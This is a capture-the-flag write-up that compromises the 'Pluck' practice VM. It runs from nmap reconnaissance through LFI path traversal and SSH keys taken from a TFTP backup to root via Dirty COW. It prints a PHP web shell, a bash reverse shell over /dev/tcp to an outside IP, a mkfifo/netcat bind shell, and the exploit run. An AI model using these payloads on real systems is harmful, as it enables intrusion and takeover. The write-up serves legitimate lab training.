# The Pluck VM
Once the pluck VM was downloaded, and VM box was installed, the OS booted directly to a login. At this point the CTF began. 

# Reconnaissance Phase
To determine the attack surface, a quick nmap scan was conducted to profile the target (despite the fact that we knew it was a Linux distrobution). 

```sh
# Quick Scan
nmap -T4 -F 192.168.56.101 -oN quick-scan.txt
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
514/tcp  filtered shell
3306/tcp open     mysql
```

Instantly you could see that it appeared to be a LAMP software stack. The most promising attack vectors were HTTP, SSH, and MySQL. To get a more in depth scan, a full scan was ran in the background while the potential vectors were enumerated.

```sh
# Full Scan
nmap -T4 -A -v 192.168.56.101 -oN full-scan.txt
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
514/tcp  filtered shell
3306/tcp open     mysql   MySQL (unauthorized)
```

# Enumeration Phase
Now that potential attack vectors had been identified, each one was explored to gain more information about the target, and confirm whether or not any vulnerabilities existed.

# HTTP
Browsing the website, you can see that it was in fact a LAMP stack (e.g. PHP based applciation). My initial thought was that the PHP app was tied to the MySQL database. The site contained two pages of interest, the admin.php and the index.php. The syntax of the "index.php?page=" instantly indicated that there was an LFI vulnerability, and likely the code execution primitive for this event. The admin page appeared to be promising, throwing in SQL escape sequence in the login produced an SQL error. To verify these attack vectors, scans were ran using DotDotPwn, and SQLMap. The SQLMap scan was ran second, but eventually revealed that that attack vector was not exploitable. 

```sh
# SQLMap using a copy of the request
sqlmap -r request.txt -p email
```

```sh
# Dot Dot Pwn Scan
# the suspect page that stood out http://192.168.56.101/index.php?page=about.php
dotdotpwn -m http-url -u http://192.168.56.101/index.php?page=TRAVERSAL -O -k "root:" -r /root/pluck/lfi.txt
```

# SSH
No vulnerabilities stuck out when conducting enumeration on this vector. The presence of this service could potentially be used, and was used later during exploitaiton.

# MySQL
Default password combinations didn't work, all attempts to authenticate were unauthorized. This service could potentially be used for privilege escalation by uploading a malicious UDF, and was placed on the back burner for later.

# HTTP - LFI Enumeration
Now that the LFI vulnerability had been confirmed, several techniques were used to determine if code execution was possible. Several of which failed. The failed attempts are listed below.

```sh
# POSTing PHP to the LFI
http://192.168.56.101/index.php?page=php://input

# Executing PHP from the log file descriptor
http://192.168.56.101/index.php?page=../../../../../proc/self/fd/1-20

# Executing PHP from a remote site
http://192.168.56.101/index.php?page=http://kali/shell.txt&cmd=id
```

After the failed attempts, the file system was enumerated to identify what users were present. On the very first attempt, the /etc/passwd file showed a huge clue. At the bottom of the passwd file, the backups user showed that the directory /backups/backup.tar allowed for TFTP access. At first I neglected the fact that it mentioned TFTP due to port scan results, but eventually the backup was retrieved via TFTP.

```sh 
tftp 192.168.56.101 -c get /backups/backup.tar
```

Instantly the home directory and var directory stood out. My first thought was to check the php file for connection strings to MySQL, viewing the source code showed that the SQL injection was a decoy. Nothing else of interest was found in the php. The home directory contained bob, paul, and peters home directories. Instantly the public and private SSH keys stood out. To confirm whether or not they were valid, each key was checked. Eventually the fourth key worked, and allowed for a connection.

```sh
root@kali:~/pluck/backup/home/paul/keys# ssh -i id_key4 paul@pluck
```

# Exploitaiton Phase

The SSH shell was restricted, shell access allowed for a handful of options, three of which stood out. The capability to list directory contents, change directories, and edit files made me think that we could write a PHP shell and include it using LFI. Pauls home directory was writable, so the following shell was written.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

This was not stealthy, we could have also used base64 commands, but this would do. To verify we had code execution, the following URL was used to see what context the shell was running under.

```sh
http://192.168.56.101/index.php?page=../../../../../home/paul/shell.php&cmd=id
```

We now had a quasi shell, next we had to get a fully interactive shell. Due to some VM issues this took longer than it should have. The first attempt was to use a reverse bash shell.

```sh
curl 'http://192.168.56.101/index.php?page=../../../../../home/paul/shell.php&cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp %2F192.168.56.1%2F443%200%3E%261' -vvv
```

Since this failed, a different approach was taken to create a TCP pipe and use that to make a bash bind shell.

```sh
mkfifo /tmp/mypipe && \
cat /tmp/mypipe|/bin/bash 2>&1|nc -l 6000 >/tmp/mypipe
```

Now the first interactive shell, to get a better shell we entered interactive mode using the bash command.

```sh
/bin/bash -i 
```

# Post Exploitation
At this point we had a low privilege shell under the context of www-data. MySQL was not accessible, so that idea was not an option for privilege escalation. To determine if any kernel exploits could be used, we check the version using uname.

```sh
uname -a
```

This indicated that the kernel was generic 4.8.0-22, so several failed exploit attempts were conducted. This exploits that failed are listed below.

```txt
https://www.exploit-db.com/exploits/40762/
https://www.exploit-db.com/exploits/40871/
https://www.exploit-db.com/exploits/41994/
https://www.exploit-db.com/exploits/41886/
```

After spending a total of 5+ hours on this CTF, a subsequent check of the version revealed that the OS version was Ubuntu 16.10. This was done by checking the release.

```sh
cat /etc/*release
```

A Google search listed Ubuntu 16.10 as being vulnerable to the "Dirty Cow" privilege escalation vulnerability. The exploit link is listed below.

```txt
https://www.exploit-db.com/exploits/40616/
```

The source code from the exploit was compiled, and the exploit was ran using the following command.

```sh
www-data@pluck:/tmp$ gcc cowroot.c -o cowroot -pthread
www-data@pluck:/tmp$ chmod +x cowroot
www-data@pluck:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@pluck:/tmp$ ./cowroot
```

# The Flag

After 5+ hours we had root access, and captured the flag.

```sh
id
uid=0(root) gid=33(www-data) groups=33(www-data)
ls /root
flag.txt
cat /root/flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
```

# Conclusion

Overall this was a medium level box. The inital clue of backups was good, but the restricted shell and hidden OS version made it tricky. Additionally, the VM setup between VM Box and VM Player caused some time to be wasted.

# Reference Links

```txt
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
http://pentestmonkey.net/blog/post-exploitation-without-a-tty
https://highon.coffee/blog/lfi-cheat-sheet/
https://blog.famzah.net/tag/bind-shell/
https://www.exploit-db.com/exploits/40762/
https://www.exploit-db.com/exploits/40871/
https://www.exploit-db.com/exploits/41994/
https://www.exploit-db.com/exploits/41886/
https://www.exploit-db.com/exploits/40616/
```